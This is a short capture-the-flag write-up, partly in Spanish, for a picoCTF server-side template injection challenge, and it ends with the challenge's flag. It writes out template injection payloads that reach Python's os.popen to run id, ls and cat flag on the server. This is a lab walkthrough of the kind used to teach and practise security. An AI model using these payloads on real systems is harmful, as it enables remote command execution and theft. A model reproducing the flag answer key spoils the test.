
**Description:**
I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.

**Hints:**
1. Server Side Template Injection


**Solución 1**

```
- Analizamos que se pude enviar cosas, y caracteres en el formulario de la página principal
- Vamos pyjali ssti a traer un código de inyección:
"request.application.__globals__.__builtins__.__import__('os').popen('id').read()"

- Vamos a hacer una cambio en la propiedad .popen, para lista los elementos que hay:
"request.application.__globals__.__builtins__.__import__('os').popen('ls').read()"

- Leemos lo que tenga el archivo flag, con cat:
"request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()"
	- Nos aparecerá la bandera luego de dar click en el OK
```


## Respuesta: **picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}**


----
Referencias:
- https://www.youtube.com/watch?v=4Pv-uyjX21I
- pyjali ssti